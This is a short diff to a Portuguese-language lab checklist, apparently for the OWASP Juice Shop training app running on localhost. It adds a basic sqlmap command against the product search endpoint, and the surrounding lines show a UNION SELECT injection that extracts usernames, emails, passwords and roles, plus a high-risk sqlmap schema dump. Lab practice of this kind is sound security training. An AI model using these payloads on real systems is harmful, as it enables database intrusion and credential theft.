@@ -240,6 +240,9 @@ orange')) UNION SELECT id,username,email,password,role,6,7,8,9 FROM users --
 - [ ] Obtenha o Schema do banco de dados SQL via SQLmap
 
 ```
+sqlmap -u "http://localhost:3000/rest/products/search?q=q"
+```
+```
 sqlmap -u "http://localhost:3000/rest/products/search?q=q" --dbms=sqlite --level=3 --risk=3 --technique=U --threads=4 --schema --no-cast --ignore-code=500
 ```
 ```
